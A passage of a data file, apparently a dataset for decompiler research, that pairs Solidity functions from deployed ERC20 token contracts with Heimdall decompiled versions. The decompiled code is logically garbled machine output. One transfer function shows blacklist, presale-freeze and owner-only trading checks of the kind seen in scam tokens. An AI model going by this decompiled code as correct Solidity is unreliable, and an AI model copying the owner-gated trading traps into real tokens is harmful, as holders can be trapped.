0x01;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x916c9A0556A89B324b8f1724330a9165C93311A9", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function unblockBot(address notbot) public onlyOwner {\r\n        bots[notbot] = false;\r\n    }", "heimdall_decompiled_code": "function unblockBot(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x10;\n        storage_map_c[var_e] = uint248(storage_map_c[var_e]);\n    }"}
{"contract_address": "0x2cAA87192a72dA386D615C986479a7E600EFc46f", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x16E04d776e1B647BE948C6D2f51Bca26401DC011", "original_solidity_code": "function launch() external onlyOwner {\r\n        require(!launched, \"Already launched\");\r\n        launched = true;\r\n        emit Launched(block.number);\r\n    }", "heimdall_decompiled_code": "function launch() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(launched / 0x010000000000000000000000000000000000000000)), \"Already launched\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x10;\n        var_d = 0x416c7265616479206c61756e6368656400000000000000000000000000000000;\n        launched = 0x010000000000000000000000000000000000000000 | (uint248(launched));\n        uint256 var_a = block.number;\n        emit Launched(block.number);\n    }"}
{"contract_address": "0xb4F77c4Cb758aeA0364f50892D20E267be9805c4", "original_solidity_code": "function name() public view override returns (string memory) {\r\n        return name_;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x08;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xB9FB64018E475BBCF128E391E62274599c4D848C", "original_solidity_code": "function emitBatchMetadataUpdate(uint256 fromTokenId, uint256 toTokenId)\\n        external\\n    {\\n        // Ensure the sender is only the owner or contract itself.\\n        _onlyOwnerOrSelf();\\n\\n        // Emit an event with the update.\\n        emit BatchMetadataUpdate(fromTokenId, toTokenId);\\n    }", "heimdall_decompiled_code": "function emitBatchMetadataUpdate(uint256 arg0, uint256 arg1) public view {\n        require(0 - (address(msg.sender) == (address(owner)) | (msg.sender == address(this))), CustomError_5fc483c5());\n        var_a = 0x5fc483c500000000000000000000000000000000000000000000000000000000;\n        uint256 var_a = arg0;\n        uint256 var_b = arg1;\n        emit BatchMetadataUpdate(arg0, arg1);\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function withdrawStuckEth(address toAddr) external onlyOwner {\\n        (bool success, ) = toAddr.call{value: address(this).balance}(\\\"\\\");\\n        require(success);\\n    }", "heimdall_decompiled_code": "function withdrawStuckEth(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        (bool success, bytes memory ret0) = address(arg0).transfer(address(this).balance);\n        require(ret0.length == 0);\n    }"}
{"contract_address": "0x09c7dBaE0F40CBAA2BBd329397f1c5A64726a04a", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!(bytes1(limitOn / 0x01000000)), \"Blacklisted\");\n        require(!(!(address(pair)) == (address(arg0))), \"Blacklisted\");\n        require((sellFee == ((sellFee * arg1) / arg1)) | !arg1, \"Blacklisted\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(0x64, \"Blacklisted\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require((burnFee == ((burnFee * arg1) / arg1)) | !arg1, \"Blacklisted\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(0x64, \"Blacklisted\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!((arg1 - ((sellFee * arg1) / 0x64)) > arg1), \"Blacklisted\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!((arg1 - ((sellFee * arg1) / 0x64)) - ((burnFee * arg1) / 0x64) > (arg1 - ((sellFee * arg1) / 0x64))), \"Blacklisted\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(address(msg.sender), \"Blacklisted\");\n        require(address(limitOn / 0x0100000000), \"Blacklisted\");\n        address var_a = address(limitOn / 0x0100000000);\n        var_c = 0x0b;\n        require(!(!bytes1(storage_map_b[var_a])), \"Blacklisted\");\n        require(!(bytes1(storage_map_b[var_a])), \"Blacklisted\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x0b;\n        var_g = 0x426c61636b6c6973746564000000000000000000000000000000000000000000;\n        require(bytes1(limitOn), \"Presale tokens are currently frozen.\");\n        require(bytes1(limitOn / 0x0100), \"Presale tokens are currently frozen.\");\n        require(bytes1(limitOn / 0x0100), \"Presale tokens are currently frozen.\");\n        require(!(bytes1(limitOn / 0x010000)), \"Presale tokens are currently frozen.\");\n        require(!(address(pair) == (address(msg.sender))), \"Presale tokens are currently frozen.\");\n        require(!(bytes1(requiredTokenRuleOn)), \"Presale tokens are currently frozen.\");\n        require(!(address(pair) == (address(limitOn / 0x0100000000))), \"Presale tokens are currently frozen.\");\n        require(!(bytes1(presaleHolderLock)), \"Presale tokens are currently frozen.\");\n        var_a = address(msg.sender);\n        var_c = 0x0f;\n        require(!storage_map_b[var_a], \"Presale tokens are currently frozen.\");\n        var_a = address(msg.sender);\n        var_c = 0x0f;\n        uint256 var_c = 0;\n        require(!(storage_map_b[var_a] - ((sellFee * arg1) / 0x64) > storage_map_b[var_a]), \"Presale tokens are currently frozen.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_b[var_a] - ((sellFee * arg1) / 0x64) < storage_map_b[var_a]), \"Presale tokens are currently frozen.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x50726573616c6520746f6b656e73206172652063757272656e746c792066726f;\n        var_h = 0x7a656e2e00000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_c = 0;\n        require(!(storage_map_b[var_a] < ((sellFee * arg1) / 0x64)), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_c = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - ((sellFee * arg1) / 0x64);\n        var_a = address(limitOn / 0x0100000000);\n        storage_map_b[var_a] = ((sellFee * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_d = (sellFee * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(limitOn / 0x0100000000), (sellFee * arg1) / 0x64);\n        require(address(msg.sender), \"ERC20: burn from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;\n        var_h = 0x7300000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_e = address(msg.sender);\n        (bool success, bytes memory ret0) = address(requiredToken).Unresolved_70a08231(var_e); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!(((var_i + ret0.length) - var_i) < 0x20), \"Insufficient Finale balance in wallet to sell.\");\n        require(!(var_i.length < requiredTokenAmount), \"Insufficient Finale balance in wallet to sell.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x2e;\n        var_h = 0x496e73756666696369656e742046696e616c652062616c616e636520696e2077;\n        var_k = 0x616c6c657420746f2073656c6c2e000000000000000000000000000000000000;\n        if (!requiredTokenRuleOn) {\n        }\n        var_a = address(limitOn / 0x0100000000);\n        var_c = 0;\n        require(!(storage_map_b[var_a] > (((sellFee * arg1) / 0x64) + storage_map_b[var_a])), \"Max holding amount exceeded\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(((sellFee * arg1) / 0x64) + storage_map_b[var_a] > maxHoldingAmount), \"Max holding amount exceeded\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1b;\n        var_g = 0x4d617820686f6c64696e6720616d6f756e742065786365656465640000000000;\n        if (!limitOn / 0x010000) {\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x13;\n        var_g = 0x53656c6c696e67206e6f7420656e61626c656400000000000000000000000000;\n        require(address(owner) == (address(msg.sender)), \"Trading not enabled\");\n        require(address(owner) == (address(limitOn / 0x0100000000)), \"Trading not enabled\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x13;\n        var_g = 0x54726164696e67206e6f7420656e61626c656400000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x31b60867a6203e76120df0612769ba136097eBc8", "original_solidity_code": "function symbol() public view  returns (string memory) {\r\n        return _tokenSSSsymbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_i) {\n            if (store_i - ((store_i >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_i >> 0x01;\n                if (store_i) {\n                    if (store_i - ((store_i >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_i >> 0x01) {\n                            if (0x1f < (store_i >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2FB4983c5Ed3d39d636aE4fb6D12309689853cbA", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xecBa347dE2C27B261314a42e1E4ed0b4a9085bCd", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool){\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x0aCf2a152c8551ba658D8D16a7Fdc1b3230d7b37", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x52aCF86689CC7AB10686e6aee34A3f628e5DcFEA", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > 0);\n        store_h = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_h));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_g / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_g / 0x01), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_g / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_g / 0x01).Unresolved_791ac947(var_l); // call\n        store_h = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_h));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x55B63E91a5A7769095662Ea0990Bb736058437c7", "original_solidity_code": "function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x06;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xbFD03022a32dB1502489AE1F65bd8f343CC09AB9", "original_solidity_code": "function isExcludedFromFees(address account) public view returns (bool) {\\r\\n        return _isExcludedFromFees[account];\\r\\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x19;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0xeD90409D82B973b1D539F8f5D3e041c387916BbA", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"Only one transfer per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_d / 0x01))), \"Only one transfer per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_e / 0x01))), \"Only one transfer per block allowed.\");\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        require(storage_map_b[var_a] < block.number, \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_h = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_h == ((arg1 * store_h) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_h) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x12;\n        require(!(address(arg0) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_h) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_h) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_h) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_h) / 0x64);\n        uint256 var_k = (arg1 * store_h) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_h) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_e = 0x40 + var_e;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_h) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_s = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_t = var_e.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((arg1 * store_h) / 0x64)) > arg1) {\n            var_a = 